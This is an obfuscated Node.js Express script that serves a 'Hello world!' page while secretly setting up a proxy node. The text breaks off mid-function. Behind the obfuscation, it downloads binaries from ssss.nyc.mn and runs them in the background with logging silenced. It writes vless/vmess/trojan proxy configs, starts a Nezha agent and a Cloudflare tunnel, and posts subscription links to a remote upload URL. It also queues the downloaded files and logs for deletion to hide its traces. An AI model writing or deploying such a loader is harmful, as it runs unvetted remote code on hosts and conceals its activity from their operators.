const _0x20818e=_0xf18e;function _0xf18e(_0x5c7c12,_0x338ada){const _0x8a1a3a=_0x8a1a();return _0xf18e=function(_0xf18eda,_0x46f5c9){_0xf18eda=_0xf18eda-0x127;let _0x5659a1=_0x8a1a3a[_0xf18eda];return _0x5659a1;},_0xf18e(_0x5c7c12,_0x338ada);}(function(_0x28639a,_0x8f769b){const _0xe35e3f={_0x54df6a:0x198,_0x579ca3:0x187,_0x3021b4:0x1d6},_0x3896cd=_0xf18e,_0x2f4c42=_0x28639a();while(!![]){try{const _0x1dfd67=parseInt(_0x3896cd(0x168))/0x1*(parseInt(_0x3896cd(0x1e9))/0x2)+-parseInt(_0x3896cd(0x1d2))/0x3*(-parseInt(_0x3896cd(0x1c6))/0x4)+-parseInt(_0x3896cd(_0xe35e3f._0x54df6a))/0x5+-parseInt(_0x3896cd(_0xe35e3f._0x579ca3))/0x6*(-parseInt(_0x3896cd(0x14c))/0x7)+parseInt(_0x3896cd(_0xe35e3f._0x3021b4))/0x8+-parseInt(_0x3896cd(0x1be))/0x9+-parseInt(_0x3896cd(0x150))/0xa;if(_0x1dfd67===_0x8f769b)break;else _0x2f4c42['push'](_0x2f4c42['shift']());}catch(_0x510042){_0x2f4c42['push'](_0x2f4c42['shift']());}}}(_0x8a1a,0xb6f58));const express=require(_0x20818e(0x13f)),app=express(),axios=require(_0x20818e(0x1cd)),os=require('os'),fs=require('fs'),path=require(_0x20818e(0x159)),{promisify}=require(_0x20818e(0x19b)),exec=promisify(require('child_process')[_0x20818e(0x17d)]),{execSync}=require(_0x20818e(0x1d5)),UPLOAD_URL=process[_0x20818e(0x1ee)][_0x20818e(0x174)]||'',PROJECT_URL=process['env'][_0x20818e(0x1ec)]||'',AUTO_ACCESS=process[_0x20818e(0x1ee)][_0x20818e(0x132)]||![],FILE_PATH=process[_0x20818e(0x1ee)][_0x20818e(0x1e4)]||_0x20818e(0x12d),SUB_PATH=process['env'][_0x20818e(0x129)]||_0x20818e(0x15c),PORT=process[_0x20818e(0x1ee)][_0x20818e(0x1e5)]||process[_0x20818e(0x1ee)][_0x20818e(0x1b8)]||0xbb8,UUID=process[_0x20818e(0x1ee)][_0x20818e(0x182)]||'357d5f94-734f-453c-abea-49ef20bf2b57',NEZHA_SERVER=process[_0x20818e(0x1ee)][_0x20818e(0x163)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x20818e(0x1ee)]['NEZHA_KEY']||'',ARGO_DOMAIN=process['env'][_0x20818e(0x18e)]||_0x20818e(0x1eb),ARGO_AUTH=process[_0x20818e(0x1ee)][_0x20818e(0x130)]||_0x20818e(0x1df),ARGO_PORT=process[_0x20818e(0x1ee)][_0x20818e(0x178)]||0x1f41,CFIP=process[_0x20818e(0x1ee)][_0x20818e(0x196)]||_0x20818e(0x17c),CFPORT=process['env'][_0x20818e(0x18d)]||0x1bb,NAME=process[_0x20818e(0x1ee)][_0x20818e(0x1d0)]||_0x20818e(0x1a5);!fs[_0x20818e(0x13e)](FILE_PATH)?(fs[_0x20818e(0x19f)](FILE_PATH),console[_0x20818e(0x179)](FILE_PATH+'\x20is\x20created')):console[_0x20818e(0x179)](FILE_PATH+_0x20818e(0x148));function generateRandomName(){const _0x1a6004={_0x5228e7:0x170,_0x23137d:0x1dc},_0x13e88a=_0x20818e,_0x442f00=_0x13e88a(0x161);let _0x22e901='';for(let _0x4c293c=0x0;_0x4c293c<0x6;_0x4c293c++){_0x22e901+=_0x442f00[_0x13e88a(_0x1a6004._0x5228e7)](Math[_0x13e88a(0x16d)](Math[_0x13e88a(0x14e)]()*_0x442f00[_0x13e88a(_0x1a6004._0x23137d)]));}return _0x22e901;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x20818e(0x1ab)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x20818e(0x1ab)](FILE_PATH,webName),botPath=path[_0x20818e(0x1ab)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x20818e(0x171)),listPath=path['join'](FILE_PATH,_0x20818e(0x197)),bootLogPath=path['join'](FILE_PATH,_0x20818e(0x14b)),configPath=path[_0x20818e(0x1ab)](FILE_PATH,_0x20818e(0x143));function deleteNodes(){const _0x408182={_0x4b4114:0x1d4,_0x51cca8:0x1e8,_0x5ae3fa:0x19e,_0xc5c333:0x1ef,_0x246e50:0x1a6},_0x45b36f=_0x20818e;try{if(!UPLOAD_URL)return;if(!fs[_0x45b36f(0x13e)](subPath))return;let _0x1ba904;try{_0x1ba904=fs[_0x45b36f(_0x408182._0x4b4114)](subPath,_0x45b36f(0x158));}catch{return null;}const _0x225581=Buffer[_0x45b36f(0x1c5)](_0x1ba904,_0x45b36f(0x1bb))[_0x45b36f(0x199)](_0x45b36f(0x158)),_0x518ea9=_0x225581[_0x45b36f(_0x408182._0x51cca8)]('\x0a')[_0x45b36f(_0x408182._0x5ae3fa)](_0x451b05=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x45b36f(0x189)](_0x451b05));if(_0x518ea9[_0x45b36f(0x1dc)]===0x0)return;return axios[_0x45b36f(_0x408182._0xc5c333)](UPLOAD_URL+_0x45b36f(_0x408182._0x246e50),JSON[_0x45b36f(0x172)]({'nodes':_0x518ea9}),{'headers':{'Content-Type':_0x45b36f(0x1bd)}})['catch'](_0x1117a5=>{return null;}),null;}catch(_0x1451fc){return null;}}function cleanupOldFiles(){const _0x1dd171={_0x56e082:0x1ab,_0x49645d:0x191},_0x4fd376=_0x20818e;try{const _0x32d89d=fs[_0x4fd376(0x12c)](FILE_PATH);_0x32d89d[_0x4fd376(0x1f0)](_0x4c858e=>{const _0x4d5b72=_0x4fd376,_0x1b33f2=path[_0x4d5b72(_0x1dd171._0x56e082)](FILE_PATH,_0x4c858e);try{const _0x36417a=fs[_0x4d5b72(_0x1dd171._0x49645d)](_0x1b33f2);_0x36417a['isFile']()&&fs[_0x4d5b72(0x15a)](_0x1b33f2);}catch(_0x513f80){}});}catch(_0x39e1f8){}}app[_0x20818e(0x13d)]('/',function(_0x36f4d2,_0x562605){const _0x497938={_0x53ae4b:0x13b},_0x3e56f5=_0x20818e;_0x562605[_0x3e56f5(_0x497938._0x53ae4b)]('Hello\x20world!');});async function generateConfig(){const _0x5c3046={_0x3840d2:0x1ac,_0x209db1:0x151,_0x85cbb9:0x186,_0x3bf51d:0x181,_0x24e44f:0x154,_0x3dfd4b:0x193,_0x188149:0x1f1,_0x4028fd:0x1c8,_0x17f8bc:0x1f3,_0x7b6370:0x166,_0x549667:0x1c8,_0x419139:0x1f3,_0x17654d:0x1e3,_0x17929e:0x147,_0x477393:0x172},_0x2125b8=_0x20818e,_0x2894f7={'log':{'access':_0x2125b8(0x1db),'error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x2125b8(0x181),'settings':{'clients':[{'id':UUID,'flow':_0x2125b8(_0x5c3046._0x3840d2)}],'decryption':_0x2125b8(_0x5c3046._0x209db1),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x2125b8(0x1bc),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x2125b8(_0x5c3046._0x85cbb9)}},{'port':0xbb9,'listen':_0x2125b8(0x154),'protocol':_0x2125b8(0x181),'settings':{'clients':[{'id':UUID}],'decryption':_0x2125b8(0x151)},'streamSettings':{'network':_0x2125b8(0x186),'security':_0x2125b8(0x151)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x2125b8(_0x5c3046._0x3bf51d),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x2125b8(_0x5c3046._0x209db1)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x2125b8(0x144)}},'sniffing':{'enabled':!![],'destOverride':[_0x2125b8(0x1f1),_0x2125b8(0x1c8),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x2125b8(_0x5c3046._0x24e44f),'protocol':_0x2125b8(_0x5c3046._0x3dfd4b),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x2125b8(_0x5c3046._0x188149),_0x2125b8(_0x5c3046._0x4028fd),_0x2125b8(_0x5c3046._0x17f8bc)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x2125b8(_0x5c3046._0x7b6370),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x2125b8(_0x5c3046._0x209db1),'wsSettings':{'path':_0x2125b8(0x1da)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x2125b8(_0x5c3046._0x549667),_0x2125b8(_0x5c3046._0x419139)],'metadataOnly':![]}}],'dns':{'servers':[_0x2125b8(_0x5c3046._0x17654d)]},'outbounds':[{'protocol':_0x2125b8(0x1ae),'tag':_0x2125b8(0x1d9)},{'protocol':'blackhole','tag':_0x2125b8(_0x5c3046._0x17929e)}]};fs[_0x2125b8(0x16f)](path[_0x2125b8(0x1ab)](FILE_PATH,_0x2125b8(0x143)),JSON[_0x2125b8(_0x5c3046._0x477393)](_0x2894f7,null,0x2));}function getSystemArchitecture(){const _0x11956c={_0x6ed336:0x16a},_0x37adde=_0x20818e,_0x232fbb=os[_0x37adde(_0x11956c._0x6ed336)]();return _0x232fbb==='arm'||_0x232fbb===_0x37adde(0x1cc)||_0x232fbb===_0x37adde(0x1a7)?'arm':_0x37adde(0x156);}function downloadFile(_0x12bde5,_0x5b4a5c,_0x4a9639){const _0x443e88={_0x26e812:0x13e,_0x21e8f0:0x19f,_0x2c00dd:0x13d,_0x580abe:0x1e2,_0x4f8d9e:0x1c0},_0x4f4926={_0x56719b:0x1ce},_0x296c78={_0x1a26b0:0x139,_0x1db7fc:0x192},_0x57575a=_0x20818e,_0x2e09b4=_0x12bde5;!fs[_0x57575a(_0x443e88._0x26e812)](FILE_PATH)&&fs[_0x57575a(_0x443e88._0x21e8f0)](FILE_PATH,{'recursive':!![]});const _0x414917=fs['createWriteStream'](_0x2e09b4);axios({'method':_0x57575a(_0x443e88._0x2c00dd),'url':_0x5b4a5c,'responseType':_0x57575a(_0x443e88._0x580abe)})[_0x57575a(0x12e)](_0x21cfc6=>{const _0x5b0476={_0xe1e6f4:0x146,_0x33d4ed:0x1ce,_0x9785a0:0x1a9},_0x32b180={_0x4fbbff:0x1ad,_0x2fa3aa:0x1ed},_0x31c05c=_0x57575a;_0x21cfc6[_0x31c05c(_0x296c78._0x1a26b0)][_0x31c05c(_0x296c78._0x1db7fc)](_0x414917),_0x414917['on']('finish',()=>{const _0x1fbd8f=_0x31c05c;_0x414917[_0x1fbd8f(_0x32b180._0x4fbbff)](),console['log'](_0x1fbd8f(0x1c2)+path[_0x1fbd8f(0x17f)](_0x2e09b4)+_0x1fbd8f(_0x32b180._0x2fa3aa)),_0x4a9639(null,_0x2e09b4);}),_0x414917['on']('error',_0x4c04e7=>{const _0x4bccdc=_0x31c05c;fs[_0x4bccdc(_0x5b0476._0xe1e6f4)](_0x2e09b4,()=>{});const _0x54662d=_0x4bccdc(0x1c2)+path['basename'](_0x2e09b4)+_0x4bccdc(_0x5b0476._0x33d4ed)+_0x4c04e7[_0x4bccdc(_0x5b0476._0x9785a0)];console['error'](_0x54662d),_0x4a9639(_0x54662d);});})[_0x57575a(_0x443e88._0x4f8d9e)](_0x371aba=>{const _0x363aef=_0x57575a,_0x45dadf=_0x363aef(0x1c2)+path['basename'](_0x2e09b4)+_0x363aef(_0x4f4926._0x56719b)+_0x371aba['message'];console[_0x363aef(0x17e)](_0x45dadf),_0x4a9639(_0x45dadf);});}async function downloadFilesAndRun(){const _0x4c48fc={_0x199448:0x1b6,_0xf905f7:0x138,_0x8d52b7:0x1e6,_0x21ebe3:0x17e,_0x4a2708:0x1f5,_0x938a76:0x1d7,_0x371923:0x17a,_0x21bf2c:0x1b3,_0x4e2795:0x162,_0x59038c:0x1f2,_0x79024b:0x1aa,_0x1434c8:0x14f,_0x2b20b1:0x165,_0x25c5de:0x12f,_0x292d00:0x17e,_0x40acf3:0x173,_0x47b3cb:0x1d7,_0x21e8d6:0x15b,_0x15518a:0x1d8,_0x3a91e6:0x1a3,_0x300b44:0x179,_0x5bcc21:0x1c3,_0x3ccd78:0x12b,_0x184cb0:0x135},_0x22db28={_0x4df4ea:0x184},_0x5cdac7=_0x20818e,_0xdff4fe=getSystemArchitecture(),_0x35c3ee=getFilesForArchitecture(_0xdff4fe);if(_0x35c3ee['length']===0x0){console['log'](_0x5cdac7(_0x4c48fc._0x199448));return;}const _0x194901=_0x35c3ee[_0x5cdac7(_0x4c48fc._0xf905f7)](_0x2644df=>{return new Promise((_0x12b1e4,_0x4edfcb)=>{downloadFile(_0x2644df['fileName'],_0x2644df['fileUrl'],(_0x199413,_0x4fb307)=>{_0x199413?_0x4edfcb(_0x199413):_0x12b1e4(_0x4fb307);});});});try{await Promise[_0x5cdac7(_0x4c48fc._0x8d52b7)](_0x194901);}catch(_0x22fb53){console[_0x5cdac7(_0x4c48fc._0x21ebe3)](_0x5cdac7(_0x4c48fc._0x4a2708),_0x22fb53);return;}function _0x4a97fd(_0x4d2dc7){const _0x783cfd=_0x5cdac7,_0x338b09=0x1fd;_0x4d2dc7[_0x783cfd(0x1f0)](_0x196154=>{const _0x38f97a={_0x101a86:0x1a8,_0xd10f27:0x179,_0x1fcc8f:0x18b},_0x12846c=_0x783cfd;fs[_0x12846c(0x13e)](_0x196154)&&fs[_0x12846c(_0x22db28._0x4df4ea)](_0x196154,_0x338b09,_0x4672b7=>{const _0x4808e8=_0x12846c;_0x4672b7?console[_0x4808e8(0x17e)](_0x4808e8(_0x38f97a._0x101a86)+_0x196154+':\x20'+_0x4672b7):console[_0x4808e8(_0x38f97a._0xd10f27)](_0x4808e8(_0x38f97a._0x1fcc8f)+_0x196154+':\x20'+_0x338b09['toString'](0x8));});});}const _0xcd0122=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4a97fd(_0xcd0122);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4f16e8=NEZHA_SERVER[_0x5cdac7(_0x4c48fc._0x938a76)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x5933fa=new Set(['443',_0x5cdac7(_0x4c48fc._0x371923),_0x5cdac7(0x136),_0x5cdac7(_0x4c48fc._0x21bf2c),_0x5cdac7(_0x4c48fc._0x4e2795),_0x5cdac7(0x1b0)]),_0x3380b9=_0x5933fa[_0x5cdac7(_0x4c48fc._0x59038c)](_0x4f16e8)?_0x5cdac7(0x19d):_0x5cdac7(_0x4c48fc._0x79024b),_0xbfb2e1=_0x5cdac7(_0x4c48fc._0x1434c8)+NEZHA_KEY+_0x5cdac7(0x16b)+NEZHA_SERVER+_0x5cdac7(0x1b7)+_0x3380b9+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x5cdac7(0x16f)](path['join'](FILE_PATH,_0x5cdac7(_0x4c48fc._0x2b20b1)),_0xbfb2e1);const _0x233767=_0x5cdac7(0x12b)+phpPath+_0x5cdac7(_0x4c48fc._0x25c5de)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x233767),console[_0x5cdac7(0x179)](phpName+_0x5cdac7(0x135)),await new Promise(_0x24ef4d=>setTimeout(_0x24ef4d,0x3e8));}catch(_0x1cd028){console[_0x5cdac7(_0x4c48fc._0x292d00)](_0x5cdac7(_0x4c48fc._0x40acf3)+_0x1cd028);}}else{let _0x41115b='';const _0x4c792f=[_0x5cdac7(0x1b1),'8443','2096',_0x5cdac7(0x1b3),_0x5cdac7(0x162),_0x5cdac7(0x1b0)];_0x4c792f[_0x5cdac7(_0x4c48fc._0x47b3cb)](NEZHA_PORT)&&(_0x41115b=_0x5cdac7(_0x4c48fc._0x21e8d6));const _0x2d94cb=_0x5cdac7(0x12b)+npmPath+_0x5cdac7(_0x4c48fc._0x15518a)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5cdac7(0x1ba)+NEZHA_KEY+'\x20'+_0x41115b+_0x5cdac7(_0x4c48fc._0x3a91e6);try{await exec(_0x2d94cb),console[_0x5cdac7(0x179)](npmName+_0x5cdac7(0x135)),await new Promise(_0x478960=>setTimeout(_0x478960,0x3e8));}catch(_0x254bca){console[_0x5cdac7(0x17e)]('npm\x20running\x20error:\x20'+_0x254bca);}}}else console[_0x5cdac7(0x179)](_0x5cdac7(0x127));const _0x1e2b3f=_0x5cdac7(0x12b)+webPath+_0x5cdac7(0x140)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x1e2b3f),console[_0x5cdac7(_0x4c48fc._0x300b44)](webName+_0x5cdac7(0x135)),await new Promise(_0x2bf192=>setTimeout(_0x2bf192,0x3e8));}catch(_0x47e78a){console['error']('web\x20running\x20error:\x20'+_0x47e78a);}if(fs[_0x5cdac7(0x13e)](botPath)){let _0x55c079;if(ARGO_AUTH[_0x5cdac7(0x1e7)](/^[A-Z0-9a-z=]{120,250}$/))_0x55c079='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x5cdac7(0x1e7)](/TunnelSecret/)?_0x55c079=_0x5cdac7(0x13a)+FILE_PATH+_0x5cdac7(_0x4c48fc._0x5bcc21):_0x55c079=_0x5cdac7(0x1d3)+FILE_PATH+_0x5cdac7(0x177)+ARGO_PORT;try{await exec(_0x5cdac7(_0x4c48fc._0x3ccd78)+botPath+'\x20'+_0x55c079+_0x5cdac7(0x194)),console['log'](botName+_0x5cdac7(_0x4c48fc._0x184cb0)),await new Promise(_0x1dd05f=>setTimeout(_0x1dd05f,0x7d0));}catch(_0x242df2){console[_0x5cdac7(_0x4c48fc._0x292d00)]('Error\x20executing\x20command:\x20'+_0x242df2);}}await new Promise(_0x5e5198=>setTimeout(_0x5e5198,0x1388));}function getFilesForArchitecture(_0x173844){const _0x3ee5a4={_0x581a5e:0x180,_0x27d348:0x180,_0x4b8cf7:0x167},_0x1abab6=_0x20818e;let _0x4690a3;_0x173844===_0x1abab6(_0x3ee5a4._0x581a5e)?_0x4690a3=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x1abab6(0x1b9)}]:_0x4690a3=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5e3904=_0x173844===_0x1abab6(_0x3ee5a4._0x27d348)?'https://arm64.ssss.nyc.mn/agent':_0x1abab6(0x1ca);_0x4690a3[_0x1abab6(_0x3ee5a4._0x4b8cf7)]({'fileName':npmPath,'fileUrl':_0x5e3904});}else{const _0x4653f5=_0x173844==='arm'?_0x1abab6(0x164):_0x1abab6(0x12a);_0x4690a3[_0x1abab6(0x167)]({'fileName':phpPath,'fileUrl':_0x4653f5});}}return _0x4690a3;}function argoType(){const _0x595ab1={_0x300afc:0x1ab,_0x504472:0x1a1,_0x6b8655:0x142},_0x39b580=_0x20818e;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x39b580(0x179)](_0x39b580(0x1c4));return;}if(ARGO_AUTH['includes'](_0x39b580(0x157))){fs[_0x39b580(0x16f)](path[_0x39b580(_0x595ab1._0x300afc)](FILE_PATH,_0x39b580(0x15d)),ARGO_AUTH);const _0x103808=_0x39b580(0x1ea)+ARGO_AUTH['split']('\x22')[0xb]+_0x39b580(0x137)+path[_0x39b580(0x1ab)](FILE_PATH,_0x39b580(0x15d))+_0x39b580(_0x595ab1._0x504472)+ARGO_DOMAIN+_0x39b580(_0x595ab1._0x6b8655)+ARGO_PORT+_0x39b580(0x169);fs['writeFileSync'](path[_0x39b580(0x1ab)](FILE_PATH,_0x39b580(0x15f)),_0x103808);}else console[_0x39b580(0x179)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x428208={_0x325d3f:0x1a4,_0x91429f:0x1ab,_0x1b8255:0x179,_0x52ff17:0x1ab,_0x45ad95:0x14b,_0x3c0b88:0x1d3,_0x23d2ab:0x177,_0x192839:0x194,_0x14cb9f:0x135,_0x187cba:0x14d},_0x11f41f={_0x5dff84:0x13d,_0x427fd5:0x139,_0x48153b:0x1f4,_0xf85aa6:0x139},_0x449bfb={_0x460ef7:0x1a0,_0x5a2d09:0x1d1,_0x51bf45:0x1c7,_0x2015f2:0x1e0},_0x1f944a=_0x20818e;let _0xac498f;if(ARGO_AUTH&&ARGO_DOMAIN)_0xac498f=ARGO_DOMAIN,console[_0x1f944a(0x179)](_0x1f944a(_0x428208._0x325d3f),_0xac498f),await _0x512674(_0xac498f);else try{const _0x4384b5=fs[_0x1f944a(0x1d4)](path[_0x1f944a(_0x428208._0x91429f)](FILE_PATH,'boot.log'),_0x1f944a(0x158)),_0x2c0c92=_0x4384b5[_0x1f944a(0x1e8)]('\x0a'),_0x5dba20=[];_0x2c0c92[_0x1f944a(0x1f0)](_0x2e8ce4=>{const _0x3c141c=_0x1f944a,_0x47f180=_0x2e8ce4[_0x3c141c(0x1e7)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x47f180){const _0x1c5c40=_0x47f180[0x1];_0x5dba20[_0x3c141c(0x18f)](_0x1c5c40);}});if(_0x5dba20[_0x1f944a(0x1dc)]>0x0)_0xac498f=_0x5dba20[0x0],console[_0x1f944a(0x179)](_0x1f944a(0x175),_0xac498f),await _0x512674(_0xac498f);else{console[_0x1f944a(_0x428208._0x1b8255)](_0x1f944a(0x190)),fs['unlinkSync'](path[_0x1f944a(_0x428208._0x52ff17)](FILE_PATH,_0x1f944a(_0x428208._0x45ad95)));async function _0x261097(){const _0x4d3f13=_0x1f944a;try{process[_0x4d3f13(_0x449bfb._0x460ef7)]===_0x4d3f13(0x13c)?await exec(_0x4d3f13(_0x449bfb._0x5a2d09)+botName+_0x4d3f13(_0x449bfb._0x51bf45)):await exec(_0x4d3f13(_0x449bfb._0x2015f2)+botName['charAt'](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x3b3ae0){}}_0x261097(),await new Promise(_0x623ea9=>setTimeout(_0x623ea9,0xbb8));const _0x46ef0f=_0x1f944a(_0x428208._0x3c0b88)+FILE_PATH+_0x1f944a(_0x428208._0x23d2ab)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x46ef0f+_0x1f944a(_0x428208._0x192839)),console[_0x1f944a(0x179)](botName+_0x1f944a(_0x428208._0x14cb9f)),await new Promise(_0x43a05d=>setTimeout(_0x43a05d,0xbb8)),await extractDomains();}catch(_0x18ef4c){console[_0x1f944a(0x17e)](_0x1f944a(_0x428208._0x187cba)+_0x18ef4c);}}}catch(_0x25e9f7){console[_0x1f944a(0x17e)](_0x1f944a(0x1cf),_0x25e9f7);}async function _0x534c3a(){const _0x3e33d6=_0x1f944a;try{const _0x2a9d74=await axios[_0x3e33d6(_0x11f41f._0x5dff84)](_0x3e33d6(0x17b),{'timeout':0xbb8});if(_0x2a9d74[_0x3e33d6(0x139)]&&_0x2a9d74['data'][_0x3e33d6(0x185)]&&_0x2a9d74['data'][_0x3e33d6(0x160)])return _0x2a9d74[_0x3e33d6(_0x11f41f._0x427fd5)][_0x3e33d6(0x185)]+'_'+_0x2a9d74[_0x3e33d6(0x139)]['org'];}catch(_0x373623){try{const _0x589b4f=await axios[_0x3e33d6(_0x11f41f._0x5dff84)](_0x3e33d6(0x18a),{'timeout':0xbb8});if(_0x589b4f[_0x3e33d6(_0x11f41f._0x427fd5)]&&_0x589b4f[_0x3e33d6(_0x11f41f._0x427fd5)]['status']==='success'&&_0x589b4f[_0x3e33d6(0x139)][_0x3e33d6(0x1f4)]&&_0x589b4f[_0x3e33d6(0x139)][_0x3e33d6(0x160)])return _0x589b4f['data'][_0x3e33d6(_0x11f41f._0x48153b)]+'_'+_0x589b4f[_0x3e33d6(_0x11f41f._0xf85aa6)][_0x3e33d6(0x160)];}catch(_0x241fe7){}}return _0x3e33d6(0x188);}async function _0x512674(_0x11c43b){const _0x1d4f7c={_0xf366f4:0x1e1,_0x5023c8:0x1c8,_0x173b7c:0x149,_0x2f15f1:0x155,_0x1d0640:0x172,_0x5282db:0x153,_0x52eb40:0x141,_0x4015ab:0x179},_0x52c801=await _0x534c3a(),_0x3a9223=NAME?NAME+'-'+_0x52c801:_0x52c801;return new Promise(_0x2a0ae8=>{setTimeout(()=>{const _0x4cdfa9={_0x4be3a9:0x1c5,_0x126600:0x199},_0x59396b=_0xf18e,_0x31257a={'v':'2','ps':''+_0x3a9223,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x59396b(0x151),'net':'ws','type':_0x59396b(0x151),'host':_0x11c43b,'path':_0x59396b(_0x1d4f7c._0xf366f4),'tls':_0x59396b(_0x1d4f7c._0x5023c8),'sni':_0x11c43b,'alpn':'','fp':_0x59396b(0x133)},_0x5d47a6=_0x59396b(_0x1d4f7c._0x173b7c)+UUID+'@'+CFIP+':'+CFPORT+_0x59396b(0x15e)+_0x11c43b+_0x59396b(_0x1d4f7c._0x2f15f1)+_0x11c43b+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x3a9223+_0x59396b(0x16c)+Buffer['from'](JSON[_0x59396b(_0x1d4f7c._0x1d0640)](_0x31257a))[_0x59396b(0x199)]('base64')+_0x59396b(0x1c9)+UUID+'@'+CFIP+':'+CFPORT+_0x59396b(_0x1d4f7c._0x5282db)+_0x11c43b+_0x59396b(0x155)+_0x11c43b+_0x59396b(_0x1d4f7c._0x52eb40)+_0x3a9223+_0x59396b(0x16e);console[_0x59396b(_0x1d4f7c._0x4015ab)](Buffer[_0x59396b(0x1c5)](_0x5d47a6)['toString'](_0x59396b(0x1bb))),fs[_0x59396b(0x16f)](subPath,Buffer[_0x59396b(0x1c5)](_0x5d47a6)[_0x59396b(0x199)]('base64')),console['log'](FILE_PATH+_0x59396b(0x19c)),uploadNodes(),app[_0x59396b(0x13d)]('/'+SUB_PATH,(_0x2c43cc,_0x5c3e6d)=>{const _0x19db82=_0x59396b,_0x20768a=Buffer[_0x19db82(_0x4cdfa9._0x4be3a9)](_0x5d47a6)[_0x19db82(_0x4cdfa9._0x126600)]('base64');_0x5c3e6d[_0x19db82(0x1de)]('Content-Type','text/plain;\x20charset=utf-8'),_0x5c3e6d[_0x19db82(0x13b)](_0x20768a);}),_0x2a0ae8(_0x5d47a6);},0x7d0);});}}async function uploadNodes(){const _0x570f2b={_0x3866af:0x1c1,_0x44b7a3:0x1cb,_0x1afde7:0x179,_0x344d83:0x1e8,_0x3fefba:0x1af,_0xc91ad1:0x1bd,_0x51e4e8:0x179},_0x40b20a=_0x20818e;if(UPLOAD_URL&&PROJECT_URL){const _0x4c09dc=PROJECT_URL+'/'+SUB_PATH,_0x5e441e={'subscription':[_0x4c09dc]};try{const _0x174289=await axios[_0x40b20a(0x1ef)](UPLOAD_URL+_0x40b20a(_0x570f2b._0x3866af),_0x5e441e,{'headers':{'Content-Type':'application/json'}});return _0x174289&&_0x174289[_0x40b20a(_0x570f2b._0x44b7a3)]===0xc8?(console[_0x40b20a(_0x570f2b._0x1afde7)](_0x40b20a(0x131)),_0x174289):null;}catch(_0x23dfb8){if(_0x23dfb8[_0x40b20a(0x183)]){if(_0x23dfb8[_0x40b20a(0x183)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x40b20a(0x13e)](listPath))return;const _0x75527=fs[_0x40b20a(0x1d4)](listPath,_0x40b20a(0x158)),_0x449b26=_0x75527[_0x40b20a(_0x570f2b._0x344d83)]('\x0a')[_0x40b20a(0x19e)](_0x4c11bf=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x40b20a(0x189)](_0x4c11bf));if(_0x449b26[_0x40b20a(0x1dc)]===0x0)return;const _0x116f2c=JSON[_0x40b20a(0x172)]({'nodes':_0x449b26});try{const _0x464fca=await axios[_0x40b20a(0x1ef)](UPLOAD_URL+_0x40b20a(_0x570f2b._0x3fefba),_0x116f2c,{'headers':{'Content-Type':_0x40b20a(_0x570f2b._0xc91ad1)}});return _0x464fca&&_0x464fca[_0x40b20a(0x1cb)]===0xc8?(console[_0x40b20a(_0x570f2b._0x51e4e8)]('Nodes\x20uploaded\x20successfully'),_0x464fca):null;}catch(_0x44ad25){return null;}}else return;}}function cleanFiles(){const _0x2269eb={_0x451f8e:0x14a,_0x12cc37:0x152};setTimeout(()=>{const _0x5cc29e={_0x4bfaa3:0x179},_0x4e56f6={_0x212537:0x1dd,_0x22b840:0x18c},_0x5eab61=_0xf18e,_0x358300=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x358300[_0x5eab61(0x18f)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x358300['push'](phpPath);process['platform']===_0x5eab61(0x13c)?exec(_0x5eab61(_0x2269eb._0x451f8e)+_0x358300[_0x5eab61(0x1ab)]('\x20')+_0x5eab61(_0x2269eb._0x12cc37),_0x3dbef4=>{const 